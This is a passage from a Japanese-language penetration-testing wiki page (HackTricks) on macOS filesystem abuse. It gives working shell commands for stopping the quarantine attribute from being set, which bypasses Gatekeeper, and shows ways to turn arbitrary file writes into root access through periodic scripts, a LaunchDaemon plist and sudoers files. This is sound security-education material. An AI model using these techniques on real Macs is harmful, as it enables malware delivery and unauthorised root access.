# macOS FSのトリック

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## POSIXパーミッションの組み合わせ

**ディレクトリ**のパーミッション：

* **読み取り** - ディレクトリのエントリを**列挙**できます
* **書き込み** - ディレクトリにファイルを**削除/書き込み**できます
* **実行** - ディレクトリを**トラバース**することができます - この権限がない場合、そのディレクトリ内またはサブディレクトリ内のファイルにアクセスできません。

### 危険な組み合わせ

**rootが所有するファイル/フォルダを上書き**する方法：

* パスの1つの親ディレクトリの所有者がユーザーである
* パスの1つの親ディレクトリの所有者が**書き込みアクセス**を持つ**ユーザーグループ**である
* ユーザーグループがファイルに**書き込み**アクセス権を持つ

前述のいずれかの組み合わせで、攻撃者は特権の任意の書き込みを取得するために、予想されるパスに**シンボリックリンク/ハードリンク**を注入することができます。

### フォルダのルートR+X特殊ケース

**rootのみがR+Xアクセス権を持つディレクトリ**にファイルがある場合、他の誰にもアクセスできません。したがって、**制限**のために読み取ることができない**ユーザーが読み取ることができるファイル**を、このフォルダから**別のフォルダ**に移動する脆弱性がある場合、これらのファイルを読み取るために悪用することができます。

例：[https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## シンボリックリンク/ハードリンク

特権プロセスが**制御可能なファイル**にデータを書き込んでいる場合、または**低特権ユーザー**によって**事前に作成**されたファイルにデータを書き込んでいる場合、ユーザーはシンボリックリンクまたはハードリンクを介して別のファイルにそれを指すことができ、特権プロセスはそのファイルに書き込みます。

特権の任意の書き込みを悪用して特権をエスカレーションする方法については、他のセクションを確認してください。

## 任意のFD

**プロセスが高特権でファイルまたはフォルダを開く**ことができる場合、**`crontab`**を悪用して`/etc/sudoers.d`内のファイルを**`EDITOR=exploit.py`**で開くことができます。そのため、`exploit.py`は`/etc/sudoers`内のファイルへのFDを取得し、それを悪用します。

例：[https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## クォレンティンxattrsトリックの回避

### uchg / uchange / uimmutableフラグ

ファイル/フォルダにこの不変の属性がある場合、それにxattrを設定することはできません。
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs マウント

**devfs** マウントは **xattr をサポートしていません**。詳細は [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html) を参照してください。
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

このACLは、ファイルに`xattrs`を追加することを防止します。
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble**ファイル形式は、ACE（アクセス制御エントリ）を含むファイルをコピーします。

[**ソースコード**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)では、**`com.apple.acl.text`**という名前のxattrに格納されたACLテキスト表現が、展開されたファイルにACLとして設定されることがわかります。したがって、ACLが他のxattrの書き込みを防止するACLを持つアプリケーションをAppleDoubleファイル形式でzipファイルに圧縮した場合、quarantine xattrはアプリケーションに設定されませんでした。

詳細については、[**元のレポート**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)を参照してください。

これを再現するには、まず正しいACL文字列を取得する必要があります：
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
（注意：これが機能する場合でも、サンドボックスはquarantine xattrを書き込みます）

本当に必要ではありませんが、念のために残しておきます：

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## コード署名のバイパス

バンドルには、**`_CodeSignature/CodeResources`**というファイルが含まれており、バンドル内のすべての**ファイル**の**ハッシュ**が含まれています。ただし、CodeResourcesのハッシュは**実行可能ファイルに埋め込まれている**ため、それには手を出せません。

ただし、いくつかのファイルの署名はチェックされないため、これらのファイルにはplist内のomitキーがあります。
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
## DMGのマウント

ユーザーは、既存のフォルダの上にカスタムDMGを作成してマウントすることができます。以下は、カスタムコンテンツを含むカスタムDMGパッケージを作成する方法です：

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote
```
{% endcode %}

## 任意の書き込み

### 定期的なshスクリプト

もしスクリプトが**シェルスクリプト**として解釈される可能性がある場合、毎日トリガーされる**`/etc/periodic/daily/999.local`**シェルスクリプトを上書きすることができます。

次のコマンドでこのスクリプトの実行を**偽装**することができます: **`sudo periodic daily`**

### デーモン

任意のスクリプトを実行するplistを使用して、**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**のような任意の**LaunchDaemon**を書き込みます。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
### Sudoersファイル

**任意の書き込み**権限がある場合、**`/etc/sudoers.d/`**フォルダ内に自分自身に**sudo**権限を付与するファイルを作成できます。

## 参考文献

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ HackTricksであなたの**企業を宣伝**したいですか？または、**PEASSの最新バージョンやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
